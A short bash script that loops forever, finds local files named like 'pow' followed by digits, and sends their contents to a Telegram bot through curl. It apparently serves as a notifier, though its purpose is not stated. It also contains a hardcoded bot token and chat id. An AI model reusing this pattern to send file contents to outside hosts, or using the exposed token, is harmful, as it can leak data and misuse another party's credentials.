#!/bin/bash

# Function to URL encode the content
urlencode() {
    # Usage: urlencode "string"
    local string="$1"
    echo -n "$string" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g'
}
while true; do
    # Execute the find command and store the result in the "result" variable
    result=$(find . -type f -name 'pow[0-9][0-9][0-9][0-9]*')

    # Check if there are any results
    if [ -n "$result" ]; then
        # Loop through each result
        while IFS= read -r file; do
            # Output the content of the file
            cat "$file"
            # Get the content of the file
            content=$(cat "$file")
            # Encode the content for the URL
            encoded_content=$(urlencode "$content")
            # Get the filename
            filename=$(basename "$file")

            # rm $filename
            # Make a curl GET request with the content of the file appended to the URL
            curl -X GET "https://api.telegram.org/bot6851381197:AAHJ5Yy7iqn_psValJJa1hZ71n8KSKEZ5U4/sendMessage?chat_id=638066999&text=1$filename$encoded_content"
        done <<< "$result"
    fi

    # Sleep for 5 seconds before the next iteration
    sleep 5
done
